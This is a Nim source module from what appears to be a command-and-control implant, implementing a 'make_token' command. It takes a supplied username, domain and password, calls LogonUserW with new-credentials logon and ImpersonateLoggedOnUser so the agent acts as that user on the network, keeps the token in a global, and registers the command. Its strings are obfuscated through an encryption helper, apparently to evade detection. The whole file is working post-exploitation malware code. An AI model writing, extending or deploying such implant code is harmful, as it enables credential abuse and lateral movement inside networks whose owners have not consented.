import std/[json, strutils]
import core/types
import commands/registry
import crypto/strenc
import commands/execution/token_mgr

when defined(windows):
  type
    HANDLE = int
    DWORD  = uint32
    BOOL   = int32

  const
    LOGON32_LOGON_NEWCREDENTIALS = DWORD(9)
    LOGON32_PROVIDER_WINNT50     = DWORD(3)

  proc LogonUserW(lpUser: ptr uint16, lpDomain: ptr uint16,
                  lpPass: ptr uint16, logonType: DWORD,
                  logonProvider: DWORD, phToken: ptr HANDLE): BOOL
    {.importc: "LogonUserW", dynlib: "advapi32".}
  proc ImpersonateLoggedOnUser(h: HANDLE): BOOL
    {.importc: "ImpersonateLoggedOnUser", dynlib: "advapi32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}

  proc toWide(s: string): seq[uint16] =
    result = newSeq[uint16](s.len + 1)
    for i, c in s:
      result[i] = uint16(c)
    result[s.len] = 0

proc makeTokenExecute(taskId: string, params: JsonNode,
                      state: AgentState, send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("make_token: Windows only"),
                      status: "error", completed: true)
  else:
    let username = params{"username"}.getStr("")
    let domain   = params{"domain"}.getStr(".")
    let password = params{"password"}.getStr("")

    if username.len == 0 or password.len == 0:
      return TaskResult(output: hidstr("Error: username and password required"),
                        status: "error", completed: true)

    var wUser = toWide(username)
    var wDom  = toWide(domain)
    var wPass = toWide(password)

    var hToken: HANDLE
    if LogonUserW(addr wUser[0], addr wDom[0], addr wPass[0],
                  LOGON32_LOGON_NEWCREDENTIALS, LOGON32_PROVIDER_WINNT50,
                  addr hToken) == 0:
      return TaskResult(output: hidstr("Error: LogonUserW failed"),
                        status: "error", completed: true)

    if ImpersonateLoggedOnUser(hToken) == 0:
      discard CloseHandle(hToken)
      return TaskResult(
        output: hidstr("Error: ImpersonateLoggedOnUser failed"),
        status: "error", completed: true)

    if gImpersonatedToken != 0:
      discard CloseHandle(gImpersonatedToken)
    gImpersonatedToken = hToken

    return TaskResult(
      output: hidstr("Token created - impersonating ") & domain & "\\" & username,
      status: "success", completed: true)

proc initMakeToken*() =
  register(hidstr("make_token"), makeTokenExecute)
